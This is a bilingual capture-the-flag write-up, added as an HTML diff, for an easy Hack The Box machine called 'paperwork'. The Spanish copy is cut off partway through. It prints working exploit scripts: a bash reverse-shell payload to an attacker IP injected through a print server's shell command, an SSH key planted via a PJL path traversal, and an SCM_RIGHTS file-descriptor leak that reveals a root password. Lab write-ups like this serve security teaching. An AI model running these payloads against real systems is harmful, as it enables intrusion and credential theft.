@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>paperwork | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">paperwork</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+
+            <!-- ==================== ENGLISH ==================== -->
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+
+                    <p>The target machine exposed three services: SSH on port 22, an nginx web application on port 80, and a custom LPD-style print server on port 1515. The web application served as a clue board that also offered a download of the print server's Python source code.</p>
+
+                    <p>Analysing the source code revealed a classic command injection vulnerability in the <code>subprocess.Popen</code> call that used a user-controlled <code>job_name</code> value unsafely inside a shell-interpolated string. By crafting a raw socket payload that conformed to the server's binary protocol, it was possible to inject a bash reverse shell into the <code>job_name</code> field and gain a foothold as the <code>lp</code> user.</p>
+
+                    <p>Once inside, a locally-bound JetDirect-style service on port 9100 was found running as <code>archivist</code>. Abusing its <code>@PJL FSDOWNLOAD</code> capability via a crafted socket payload, an SSH public key was written to <code>/home/archivist/.ssh/authorized_keys</code>, obtaining a shell as <code>archivist</code>.</p>
+
+                    <p>From there, a root-owned daemon (<code>paperwork-daemon</code>) was discovered, communicating over a Unix domain socket accessible by <code>archivist</code>. The daemon's logic triggered a lockdown mode when specific keywords appeared in a log file that <code>archivist</code> could write. In lockdown mode the daemon forwarded open file descriptors — including the one for <code>/etc/paperwork/admin_pins.conf</code> — to whoever connected to the socket. A short Python script read those descriptors and extracted the admin password, which was also the root password.</p>
+
+                    <p><strong>Technologies/Exploits:</strong> Custom socket protocol reverse engineering, <code>subprocess.Popen</code> shell injection, JetDirect PJL filesystem write abuse, Unix socket SCM_RIGHTS file descriptor leakage.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and running services:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#6a9fb5;">PORT</span>      <span style="color:#6a9fb5;">STATE</span>  <span style="color:#6a9fb5;">SERVICE</span>   <span style="color:#6a9fb5;">VERSION</span>
+<span style="color:#90a959;">22/tcp</span>    open   ssh       OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
+<span style="color:#90a959;">80/tcp</span>    open   http      nginx 1.28.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://paperwork.htb/
+|_http-server-header: nginx/1.28.0 (Ubuntu)
+<span style="color:#90a959;">1515/tcp</span>  open   ifor-protocol?
+| fingerprint-strings:
+|   TerminalServer, TerminalServerCookie:
+|_  Archive_Printer is ready and printing.
+
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>Three ports stand out: SSH on 22, an HTTP server that redirects to <code>paperwork.htb</code> on 80, and an unknown service on port 1515 that responds with <em>"Archive_Printer is ready and printing."</em> — a banner suggesting some kind of print or archive daemon. I add <code>paperwork.htb</code> to <code>/etc/hosts</code> and move to web enumeration.</p>
+
+                <h2>Web Enumeration — Port 80</h2>
+                <p>Visiting the web application reveals a simple page:</p>
+
+                <p><img src="./media/image1.png" alt="Web page at paperwork.htb showing a maintenance advisory mentioning a legacy gateway and a download link for paperwork-archive-v1.02" /></p>
+
+                <p>The maintenance advisory hints that the "legacy gateway" refers to the service running on port 1515. More importantly, clicking the <code>paperwork-archive-v1.02</code> link downloads the Python source code of that very service — this is a significant advantage for exploitation, as we have full visibility into the server's protocol and logic.</p>
+
+                <h2>Source Code Analysis — The LPD Print Server</h2>
+                <p>The downloaded source implements a custom LPD-style print queue server. The relevant logic is:</p>
+
+                <pre><code class="language-python"><span style="color:#c678dd;">import</span> socket
+<span style="color:#c678dd;">import</span> threading
+<span style="color:#c678dd;">import</span> subprocess
+<span style="color:#c678dd;">import</span> os
+
+VALID_QUEUE = os.environ.get(<span style="color:#98c379;">"LPD_QUEUE"</span>)
+
+<span style="color:#c678dd;">class</span> <span style="color:#e5c07b;">LpdHandler</span>(threading.Thread):
+    <span style="color:#c678dd;">def</span> <span style="color:#61afef;">__init__</span>(self, sock, addr):
+        <span style="color:#61afef;">super</span>().__init__()
+        self.sock = sock
+        self.addr = addr
+        self.id = <span style="color:#98c379;">f"[lpd-{addr[1]}]"</span>
+
+    <span style="color:#c678dd;">def</span> <span style="color:#61afef;">run</span>(self):
+        <span style="color:#c678dd;">try</span>:
+            data = self.sock.recv(<span style="color:#d19a66;">1024</span>)
+            <span style="color:#c678dd;">if not</span> data: <span style="color:#c678dd;">return</span>
+            command = data[<span style="color:#d19a66;">0</span>]
+            <span style="color:#c678dd;">if</span> command == <span style="color:#d19a66;">2</span>:
+                self.handle_print_job(data)
+            <span style="color:#c678dd;">elif</span> command <span style="color:#c678dd;">in</span> (<span style="color:#d19a66;">3</span>, <span style="color:#d19a66;">4</span>):
+                self.sock.send(<span style="color:#98c379;">b"Archive_Printer is ready and printing.\n"</span>)
+        <span style="color:#c678dd;">except</span> Exception <span style="color:#c678dd;">as</span> e:
+            <span style="color:#61afef;">print</span>(<span style="color:#98c379;">f"{self.id} Error: {e}"</span>)
+        <span style="color:#c678dd;">finally</span>:
+            self.sock.close()
+
+    <span style="color:#c678dd;">def</span> <span style="color:#61afef;">handle_print_job</span>(self, data):
+        queue = data[<span style="color:#d19a66;">1</span>:].decode().strip()
+        <span style="color:#c678dd;">if</span> queue <span style="color:#c678dd;">not in</span> VALID_QUEUE:
+            <span style="color:#61afef;">print</span>(<span style="color:#98c379;">f"{self.id} Rejected: Invalid queue '{queue}'"</span>)
+            self.sock.send(<span style="color:#98c379;">b'\x01'</span>)
+            <span style="color:#c678dd;">return</span>
+
+        <span style="color:#61afef;">print</span>(<span style="color:#98c379;">f"{self.id} Accepted job for queue: {queue}"</span>)
+        <span style="color:#c678dd;">while</span> <span style="color:#d19a66;">True</span>:
+            chunk = self.sock.recv(<span style="color:#d19a66;">1024</span>)
+            <span style="color:#c678dd;">if not</span> chunk: <span style="color:#c678dd;">break</span>
+            subcommand = chunk[<span style="color:#d19a66;">0</span>]
+            self.sock.send(<span style="color:#98c379;">b'\x00'</span>)
+            parts = chunk[<span style="color:#d19a66;">1</span>:].decode(errors=<span style="color:#98c379;">'ignore'</span>).split()
+            <span style="color:#c678dd;">if not</span> parts: <span style="color:#c678dd;">continue</span>
+            size = <span style="color:#61afef;">int</span>(parts[<span style="color:#d19a66;">0</span>])
+            content = <span style="color:#98c379;">b""</span>
+            <span style="color:#c678dd;">while</span> <span style="color:#61afef;">len</span>(content) &lt; size:
+                content += self.sock.recv(size - <span style="color:#61afef;">len</span>(content) + <span style="color:#d19a66;">1</span>)
+            decoded_content = content.decode(errors=<span style="color:#98c379;">'ignore'</span>)
+            job_name = <span style="color:#98c379;">"Unknown"</span>
+            <span style="color:#c678dd;">for</span> line <span style="color:#c678dd;">in</span> decoded_content.split(<span style="color:#98c379;">'\n'</span>):
+                line = line.strip()
+                <span style="color:#c678dd;">if</span> line.startswith(<span style="color:#98c379;">'J'</span>):
+                    job_name = line[<span style="color:#d19a66;">1</span>:]
+                    <span style="color:#c678dd;">break</span>
+
+            <span style="color:#61afef;">print</span>(<span style="color:#98c379;">f"{self.id} Executing archive for: {job_name}"</span>)
+            subprocess.Popen(
+                <span style="color:#98c379;">f"echo 'Archive: {job_name}' &gt;&gt; /tmp/archive.log"</span>,
+                shell=<span style="color:#d19a66;">True</span>
+            )
+            self.sock.send(<span style="color:#98c379;">b'\x00'</span>)
+            self.sock.send(<span style="color:#98c379;">b'\x00'</span>)
+            <span style="color:#c678dd;">while</span> self.sock.recv(<span style="color:#d19a66;">4096</span>):
+                <span style="color:#c678dd;">pass</span>
+            <span style="color:#c678dd;">break</span></code></pre>
+
+                <h3>Identifying the Injection Point</h3>
+                <p>The critical line is the <code>subprocess.Popen</code> call on the last section of <code>handle_print_job</code>:</p>
+
+                <pre><code class="language-python">subprocess.Popen(
+    <span style="color:#98c379;">f"echo 'Archive: {job_name}' &gt;&gt; /tmp/archive.log"</span>,
+    shell=<span style="color:#d19a66;">True</span>
+)</code></pre>
+
+                <p>The <code>job_name</code> variable is interpolated directly into a shell command string without any sanitisation. This is a textbook command injection. Tracing backwards where <code>job_name</code> comes from:</p>
+
+                <pre><code class="language-plaintext">job_name
+  ← line[1:]
+    ← line starts with 'J'
+      ← decoded_content.split('\n')
+        ← decoded_content = content.decode()
+          ← content read from socket (size bytes)</code></pre>
+
+                <p>In short: we fully control the content of the "control file" sent over the socket, and any line starting with <code>J</code> becomes <code>job_name</code> — which then lands unquoted inside a shell string.</p>
+
+                <p>The web page also tells us the valid queue name: <code>archive_intake</code>. This maps to the <code>VALID_QUEUE</code> environment variable check — without sending this exact queue name the connection is rejected immediately.</p>
+
+                <h3>Crafting the Payload</h3>
+                <p>A naive payload like <code>J'; wget 10.10.15.128\n</code> would produce:</p>
+
+                <pre><code class="language-bash"><span style="color:#e5c07b;">echo</span> <span style="color:#98c379;">'Archive: '; wget 10.10.15.128</span> &gt;&gt; /tmp/archive.log</code></pre>
+
+                <p>However, testing locally against a copy of the server revealed a shell error:</p>
+
+                <pre><code class="language-plaintext">/bin/sh: 1: Syntax error: Unterminated quoted string</code></pre>
+
+                <p>The closing single-quote at the end of the <code>echo</code> template was still unmatched after the injection, causing the shell to refuse the entire command. The fix is to close the string properly and also add a trailing quote at the end so the outer template remains syntactically valid:</p>
+
+                <pre><code class="language-python">control_file = <span style="color:#98c379;">b"J'; bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.15.128/443 0&gt;&amp;1\"'\n"</span></code></pre>
+
+                <p>Having the source code available was essential here — being able to run the server locally and debug the exact error saved a lot of guesswork.</p>
+
+                <h2>Initial Access — Command Injection via Socket</h2>
+                <p>The full exploit script that speaks the server's binary protocol and injects the reverse shell is:</p>
+
+                <pre><code class="language-python"><span style="color:#c678dd;">import</span> socket
+
+s = socket.socket()
+s.connect((<span style="color:#98c379;">'paperwork.htb'</span>, <span style="color:#d19a66;">1515</span>))
+<span style="color:#61afef;">print</span>(<span style="color:#98c379;">"[*] Connected to server"</span>)
+
+<span style="color:#5c6370;"># Command 2: submit print job with queue name</span>
+payload = <span style="color:#98c379;">b'\x02archive_intake\n'</span>
+s.send(payload)
+<span style="color:#61afef;">print</span>(<span style="color:#98c379;">f"[&gt;] Sent queue command: {payload!r}"</span>)
+
+ack = s.recv(<span style="color:#d19a66;">1</span>)
+<span style="color:#61afef;">print</span>(<span style="color:#98c379;">f"[&lt;] Queue ACK: {ack!r} ({'OK' if ack == b'\\x00' else 'REJECTED'})"</span>)
+<span style="color:#c678dd;">if</span> ack != <span style="color:#98c379;">b'\x00'</span>:
+    <span style="color:#61afef;">print</span>(<span style="color:#98c379;">"[!] Server rejected queue, aborting"</span>)
+    s.close()
+    exit(<span style="color:#d19a66;">1</span>)
+
+<span style="color:#5c6370;"># Control file with injected J-line payload</span>
+control_file = <span style="color:#98c379;">b"J'; bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.15.128/443 0&gt;&amp;1\"'\n"</span>
+size = <span style="color:#61afef;">len</span>(control_file)
+<span style="color:#61afef;">print</span>(<span style="color:#98c379;">f"[*] Control file ready ({size} bytes): {control_file!r}"</span>)
+
+<span style="color:#5c6370;"># Subcommand header: byte 0x02 + size + filename</span>
+subcommand = <span style="color:#98c379;">f'\x02{size} cfA001host\n'</span>.encode()
+s.send(subcommand)
+<span style="color:#61afef;">print</span>(<span style="color:#98c379;">f"[&gt;] Sent subcommand: {subcommand!r}"</span>)
+
+ack = s.recv(<span style="color:#d19a66;">1</span>)
+<span style="color:#61afef;">print</span>(<span style="color:#98c379;">f"[&lt;] Subcommand ACK: {ack!r} ({'OK' if ack == b'\\x00' else 'ERROR'})"</span>)
+
+<span style="color:#5c6370;"># Send the actual content</span>
+s.send(control_file)
+<span style="color:#61afef;">print</span>(<span style="color:#98c379;">"[&gt;] Sent control file content"</span>)
+
+ack = s.recv(<span style="color:#d19a66;">1</span>)
+<span style="color:#61afef;">print</span>(<span style="color:#98c379;">f"[&lt;] Content ACK: {ack!r} ({'OK' if ack == b'\\x00' else 'ERROR'})"</span>)
+
+<span style="color:#61afef;">print</span>(<span style="color:#98c379;">"[+] Done. Waiting for shell..."</span>)
+s.close()</code></pre>
+
+                <p>Before running it, I verify the injection works by substituting the reverse shell with a simple <code>wget</code> callback and confirming my HTTP server receives the request from the target. Once confirmed, I set up a netcat listener and fire the reverse shell payload:</p>
+
+                <pre><code class="language-bash"><span style="color:#e5c07b;">nc</span> -lvnp 443</code></pre>
+
+                <p>The shell lands as the <code>lp</code> user. From here I begin internal enumeration.</p>
+
+                <h2>Internal Enumeration</h2>
+                <p>A quick look at <code>/home</code> reveals the user <code>archivist</code>. Checking locally bound TCP ports:</p>
+
+                <pre><code class="language-plaintext">tcp  LISTEN  0  128  127.0.0.1:1337
+tcp  LISTEN  0  100  127.0.0.1:9100</code></pre>
+
+                <p>Port 1337 is the backend for the nginx web app on port 80. Port 9100 is more interesting — checking the process list:</p>
+
+                <pre><code class="language-plaintext">archivist  980  ...  /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log</code></pre>
+
+                <p>The process is running as <code>archivist</code> from their home directory, serving a <code>jetdirect.py</code> service on port 9100. An nmap service probe from inside the machine confirms it:</p>
+
+                <pre><code class="language-plaintext">PORT      STATE  SERVICE    VERSION
+9100/tcp  open   jetdirect?</code></pre>
+
+                <p>JetDirect is HP's raw printing protocol. One of its lesser-known features is PJL (Printer Job Language), which includes filesystem commands like <code>FSDOWNLOAD</code> for writing files to the printer's storage. Since the service is running as <code>archivist</code> and its working directory is inside that user's home, this is a potential path to write an SSH key.</p>
+
+                <h2>Lateral Movement — Writing SSH Key via JetDirect PJL</h2>
+                <p>I first try interacting with the service using PRET (<a href="https://github.com/RUB-NDS/PRET">https://github.com/RUB-NDS/PRET</a>), a purpose-built PJL interaction tool, but it doesn't yield useful results for reading files. However, since the service runs as <code>archivist</code> and processes file paths relative to its working directory, a crafted <code>@PJL FSDOWNLOAD</code> command that traverses up to <code>~/.ssh/authorized_keys</code> should work.</p>
+
+                <p>The exploit script reads my local SSH public key, base64-encodes it, and sends it over a raw socket using the PJL <code>FSDOWNLOAD</code> command with a path traversal sequence:</p>
+
+                <pre><code class="language-python"><span style="color:#c678dd;">import</span> socket, base64
+
+key = <span style="color:#98c379;">"~/.ssh/kerssh.pub"</span>
+pub = <span style="color:#61afef;">open</span>(key, <span style="color:#98c379;">"rb"</span>).read().strip() + <span style="color:#98c379;">b"\n"</span>
+pub_b64 = base64.b64encode(pub).decode()
+
+payload = (
+    <span style="color:#98c379;">"import socket,base64\n"</span>
+    <span style="color:#98c379;">"pub=base64.b64decode('"</span> + pub_b64 + <span style="color:#98c379;">"')\n"</span>
+    <span style="color:#98c379;">"body=b'@PJL FSDOWNLOAD NAME=\"0:/../.ssh/authorized_keys\" SIZE=%d\\r\\n'%len(pub)+pub\n"</span>
+    <span style="color:#98c379;">"s=socket.socket();s.settimeout(5);s.connect(('127.0.0.1',9100))\n"</span>
+    <span style="color:#98c379;">"s.send(b'\\x1b%-12345X'+body+b'\\x1b%-12345X\\r\\n')\n"</span>
+    <span style="color:#98c379;">"try:\n s.recv(200)\nexcept Exception:pass\n"</span>
+    <span style="color:#98c379;">"s.close()\n"</span>
+)</code></pre>
+
+                <p>The <code>\x1b%-12345X</code> sequence is the standard PJL Universal Exit Language (UEL) header and footer used to wrap PJL commands. After executing this on the target, I can SSH in as <code>archivist</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#e5c07b;">ssh</span> -i ~/.ssh/kerssh archivist@paperwork.htb</code></pre>
+
+                <h2>Privilege Escalation — Unix Socket SCM_RIGHTS FD Leak</h2>
+                <p>Now running as <code>archivist</code>, I look for paths to root. Checking running processes:</p>
+
+                <pre><code class="language-plaintext">root  1490  ...  /usr/bin/python3 /usr/bin/paperwork-daemon</code></pre>
+
+                <p>Root is running <code>paperwork-daemon</code>. I read its source:</p>
+
+                <pre><code class="language-python"><span style="color:#5c6370;">#!/usr/bin/python3</span>
+<span style="color:#c678dd;">import</span> socket, os, array, hashlib
+<span style="color:#c678dd;">import</span> zipfile
+<span style="color:#c678dd;">import</span> shutil
+
+<span style="color:#c678dd;">try</span>:
+    admin_fd = os.open(<span style="color:#98c379;">"/etc/paperwork/admin_pins.conf"</span>, os.O_RDONLY)
+<span style="color:#c678dd;">except</span> Exception:
+    os._exit(<span style="color:#d19a66;">1</span>)
+
+LOG_PATH = <span style="color:#98c379;">"/home/archivist/printer/logs/commands.log"</span>
+
+<span style="color:#c678dd;">def</span> <span style="color:#61afef;">get_admin_secret</span>():
+    data = os.pread(admin_fd, <span style="color:#d19a66;">1024</span>, <span style="color:#d19a66;">0</span>).decode().strip()
+    <span style="color:#c678dd;">if</span> <span style="color:#98c379;">"ADMIN_PASSWORD="</span> <span style="color:#c678dd;">in</span> data:
+        <span style="color:#c678dd;">return</span> data.split(<span style="color:#98c379;">"ADMIN_PASSWORD="</span>)[<span style="color:#d19a66;">1</span>].split(<span style="color:#98c379;">"\n"</span>)[<span style="color:#d19a66;">0</span>]
+    <span style="color:#c678dd;">return</span> data
+
+<span style="color:#c678dd;">def</span> <span style="color:#61afef;">scan_for_malice</span>():
+    <span style="color:#c678dd;">if not</span> os.path.exists(LOG_PATH):
+        <span style="color:#c678dd;">return False</span>
+    <span style="color:#c678dd;">with</span> <span style="color:#61afef;">open</span>(LOG_PATH, <span style="color:#98c379;">'r'</span>) <span style="color:#c678dd;">as</span> f:
+        content = f.read().upper()
+    <span style="color:#c678dd;">if</span> <span style="color:#61afef;">any</span>(trigger <span style="color:#c678dd;">in</span> content <span style="color:#c678dd;">for</span> trigger <span style="color:#c678dd;">in</span> [<span style="color:#98c379;">"FSQUERY"</span>, <span style="color:#98c379;">"FSUPLOAD"</span>, <span style="color:#98c379;">"FSDOWNLOAD"</span>]):
+        <span style="color:#c678dd;">return True</span>
+    <span style="color:#c678dd;">return False</span>
+
+<span style="color:#c678dd;">def</span> <span style="color:#61afef;">trigger_lockdown</span>(conn):
+    <span style="color:#c678dd;">try</span>:
+        log_fd = os.open(LOG_PATH, os.O_RDONLY)
+        evidence_bundle = array.array(<span style="color:#98c379;">"i"</span>, [log_fd, admin_fd])
+        msg = <span style="color:#98c379;">b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."</span>
+        conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
+        zip_path = <span style="color:#98c379;">"/root/quarantine/evidence.zip"</span>
+        <span style="color:#c678dd;">with</span> zipfile.ZipFile(zip_path, <span style="color:#98c379;">'w'</span>, zipfile.ZIP_DEFLATED) <span style="color:#c678dd;">as</span> zipf:
+            zipf.write(LOG_PATH, arcname=<span style="color:#98c379;">"commands.log"</span>)
+        <span style="color:#c678dd;">with</span> <span style="color:#61afef;">open</span>(LOG_PATH, <span style="color:#98c379;">'w'</span>) <span style="color:#c678dd;">as</span> f:
+            f.truncate(<span style="color:#d19a66;">0</span>)
+        os.close(log_fd)
+    <span style="color:#c678dd;">except</span>:
+        <span style="color:#c678dd;">pass</span>
+
+<span style="color:#c678dd;">def</span> <span style="color:#61afef;">main</span>():
+    socket_path = <span style="color:#98c379;">"/run/paperwork/mgmt.sock"</span>
+    <span style="color:#c678dd;">if</span> os.path.exists(socket_path): os.remove(socket_path)
+    <span style="color:#c678dd;">if not</span> os.path.exists(<span style="color:#98c379;">"/run/paperwork"</span>): os.makedirs(<span style="color:#98c379;">"/run/paperwork"</span>)
+    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+    s.bind(socket_path)
+    os.chmod(socket_path, <span style="color:#d19a66;">0o660</span>)
+    os.chown(socket_path, <span style="color:#d19a66;">0</span>, <span style="color:#d19a66;">1000</span>)
+    s.listen(<span style="color:#d19a66;">5</span>)
+    <span style="color:#c678dd;">while True</span>:
+        conn, _ = s.accept()
+        <span style="color:#c678dd;">if</span> scan_for_malice():
+            trigger_lockdown(conn)
+        <span style="color:#c678dd;">else</span>:
+            secret = get_admin_secret()
+            token = hashlib.sha256(<span style="color:#98c379;">f"SYSTEM_CLEAN:{secret}"</span>.encode()).hexdigest()
+            conn.sendall(<span style="color:#98c379;">f"STATUS: SYSTEM_CLEAN\nSIGNATURE: {token}\n"</span>.encode())
+        conn.close()
+
+<span style="color:#c678dd;">if</span> __name__ == <span style="color:#98c379;">"__main__"</span>:
+    main()</code></pre>
+
+                <h3>Understanding the Daemon Logic</h3>
+                <p>The daemon opens <code>/etc/paperwork/admin_pins.conf</code> at startup and holds its file descriptor (<code>admin_fd</code>) open for the entire process lifetime. On each connection to the Unix socket at <code>/run/paperwork/mgmt.sock</code>, it checks whether a log file — <code>/home/archivist/printer/logs/commands.log</code> — contains any of the strings <code>FSQUERY</code>, <code>FSUPLOAD</code>, or <code>FSDOWNLOAD</code>.</p>
+
+                <p>If those keywords are found, the daemon calls <code>trigger_lockdown</code>, which transmits both <code>log_fd</code> and <code>admin_fd</code> to the connecting client using <code>sendmsg</code> with <code>SCM_RIGHTS</code>. This is a Linux kernel mechanism for passing open file descriptors across Unix socket connections — the receiving process can then <code>read</code> from those descriptors as if it had opened those files itself, regardless of filesystem permissions.</p>
+
+                <p>Crucially, the socket permissions are:</p>
+
+                <pre><code class="language-bash"><span style="color:#e5c07b;">ls</span> -lah /run/paperwork/mgmt.sock
+<span style="color:#98c379;">srw-rw---- 1 root archivist 0 ... /run/paperwork/mgmt.sock</span></code></pre>
+
+                <p>The socket is group-owned by <code>archivist</code> (GID 1000) with group read-write access. This means <code>archivist</code> can connect to it and receive the forwarded file descriptors — including the one pointing to <code>/etc/paperwork/admin_pins.conf</code>.</p>
+
+                <h3>Triggering the Lockdown</h3>
+                <p>The log file at <code>/home/archivist/printer/logs/commands.log</code> is writable by <code>archivist</code>. I simply write one of the trigger keywords into it:</p>
+
+                <pre><code class="language-bash"><span style="color:#e5c07b;">echo</span> <span style="color:#98c379;">"FSUPLOAD"</span> &gt;&gt; /home/archivist/printer/logs/commands.log</code></pre>
+
+                <p>Then I connect to the socket with a Python script that receives the <code>SCM_RIGHTS</code> message and reads from each forwarded file descriptor, printing any value after <code>ADMIN_PASSWORD=</code>:</p>
+
+                <pre><code class="language-python"><span style="color:#c678dd;">import</span> socket, array, os
+
+SOCK = <span style="color:#98c379;">"/run/paperwork/mgmt.sock"</span>
+
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect(SOCK)
+
+fds = array.array(<span style="color:#98c379;">"i"</span>)
+msg, anc, flags, addr = s.recvmsg(<span style="color:#d19a66;">4096</span>, socket.CMSG_SPACE(<span style="color:#d19a66;">2</span> * fds.itemsize))
+
+<span style="color:#c678dd;">for</span> level, ctype, cdata <span style="color:#c678dd;">in</span> anc:
+    <span style="color:#c678dd;">if</span> level == socket.SOL_SOCKET <span style="color:#c678dd;">and</span> ctype == socket.SCM_RIGHTS:
+        cdata = cdata[:len(cdata) - (len(cdata) % fds.itemsize)]
+        fds.frombytes(cdata)
+
+<span style="color:#c678dd;">for</span> fd <span style="color:#c678dd;">in</span> fds:
+    <span style="color:#c678dd;">try</span>:
+        data = os.pread(fd, <span style="color:#d19a66;">4096</span>, <span style="color:#d19a66;">0</span>).decode(errors=<span style="color:#98c379;">"ignore"</span>)
+        <span style="color:#c678dd;">if</span> <span style="color:#98c379;">"ADMIN_PASSWORD="</span> <span style="color:#c678dd;">in</span> data:
+            <span style="color:#61afef;">print</span>(data.split(<span style="color:#98c379;">"ADMIN_PASSWORD="</span>)[<span style="color:#d19a66;">1</span>].split(<span style="color:#98c379;">"\n"</span>)[<span style="color:#d19a66;">0</span>].strip())
+    <span style="color:#c678dd;">except</span> Exception:
+        <span style="color:#c678dd;">pass</span>
+
+s.close()</code></pre>
+
+                <p>Running this script, the admin password is printed directly to stdout:</p>
+
+                <pre><code class="language-bash">archivist@paperwork:~$ python3 xd.py
+<span style="color:#90a959;">ApparelMortuaryCedar22</span></code></pre>
+
+                <p>This password is also the root account password. Switching to root completes the machine:</p>
+
+                <pre><code class="language-bash">archivist@paperwork:~$ <span style="color:#e5c07b;">su</span> root
+Password:
+root@paperwork:/home/archivist#</code></pre>
+            </div>
+
+            <!-- ==================== ESPAÑOL ==================== -->
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+
+                    <p>La máquina objetivo exponía tres servicios: SSH en el puerto 22, una aplicación web nginx en el puerto 80, y un servidor de impresión custom al estilo LPD en el puerto 1515. La aplicación web funcionaba como tablón de anuncios y también ofrecía la descarga del código fuente Python del servidor de impresión.</p>
+
+                    <p>El análisis del código fuente reveló una vulnerabilidad de inyección de comandos clásica en la llamada a <code>subprocess.Popen</code>, que interpolaba la variable <code>job_name</code> controlada por el atacante directamente dentro de una cadena de shell sin ningún tipo de sanitización. Construyendo un payload de socket crudo que respetara el protocolo binario del servidor, fue posible inyectar una reverse shell bash en el campo <code>job_name</code> y ganar acceso como el usuario <code>lp</code>.</p>
+
+                    <p>Una vez dentro, se descubrió un servicio estilo JetDirect en el puerto 9100 corriendo localmente como <code>archivist</code>. Abusando de su funcionalidad <code>@PJL FSDOWNLOAD</code> mediante un payload de socket a medida, se escribió una clave pública SSH en <code>/home/archivist/.ssh/authorized_keys</code>, obteniendo shell como <code>archivist</code>.</p>
+
+                    <p>Desde allí, se descubrió un daemon ejecutado por root (<code>paperwork-daemon</code>) que se comunicaba a través de un socket Unix accesible por <code>archivist</code>. La lógica del daemon activaba un modo de bloqueo cuando ciertas palabras clave aparecían en un fichero de log que <code>archivist</code> podía escribir. En ese modo, el daemon reenviaba descriptores de fichero abiertos — incluyendo el de <code>/etc/paperwork/admin_pins.conf</code> — a quien se conectase al socket. Un script Python corto leyó esos descriptores y extrajo la contraseña de administrador, que también era la contraseña de root.</p>
+
+                    <p><strong>Tecnologías/Exploits:</strong> Ingeniería inversa de protocolo socket custom, inyección de comandos en <code>subprocess.Popen</code>, abuso del comando PJL <code>FSDOWNLOAD</code> de JetDirect, filtración de descriptores de fichero via <code>SCM_RIGHTS</code> en socket Unix.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo nmap para identificar puertos abiertos y servicios en ejecución:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#6a9fb5;">PORT</span>      <span style="color:#6a9fb5;">STATE</span>  <span style="color:#6a9fb5;">SERVICE</span>   <span style="color:#6a9fb5;">VERSION</span>
+<span style="color:#90a959;">22/tcp</span>    open   ssh       OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
+<span style="color:#90a959;">80/tcp</span>    open   http      nginx 1.28.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://paperwork.htb/
+|_http-server-header: nginx/1.28.0 (Ubuntu)
+<span style="color:#90a959;">1515/tcp</span>  open   ifor-protocol?
+| fingerprint-strings:
+|   TerminalServer, TerminalServerCookie:
+|_  Archive_Printer is ready and printing.
+
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>Destacan tres puertos: SSH en el 22, un servidor HTTP que redirige a <code>paperwork.htb</code> en el 80, y un servicio desconocido en el puerto 1515 que responde con <em>"Archive_Printer is ready and printing."</em> — un banner que sugiere algún tipo de daemon de impresión o archivo. Añado <code>paperwork.htb</code> a <code>/etc/hosts</code> y paso a la enumeración web.</p>
+
+                <h2>Enumeración Web — Puerto 80</h2>
+                <p>Visitar la aplicación web revela una página sencilla:</p>
+
+                <p><img src="./media/image1.png" alt="Página web en paperwork.htb mostrando un aviso de mantenimiento que menciona un legacy gateway y un enlace de descarga para paperwork-archive-v1.02" /></p>
+
+                <p>El aviso de mantenimiento insinúa que el "legacy gateway" es el servicio que corre en el puerto 1515. Más importante aún, clicar en el enlace <code>paperwork-archive-v1.02</code> descarga el código fuente Python de ese mismo servicio — una ventaja enorme para la explotación, ya que tenemos visibilidad total del protocolo y la lógica del servidor.</p>
+
+                <h2>Análisis del Código Fuente — El Servidor LPD</h2>
+                <p>El código descargado implementa un servidor de colas de impresión al estilo LPD custom. La lógica relevante es:</p>
+
+                <pre><code class="language-python"><span style="color:#c678dd;">import</span> socket
+<span style="color:#c678dd;">import</span> threading
+<span style="color:#c678dd;">import</span> subprocess
+<span style="color:#c678dd;">import</span> os
+
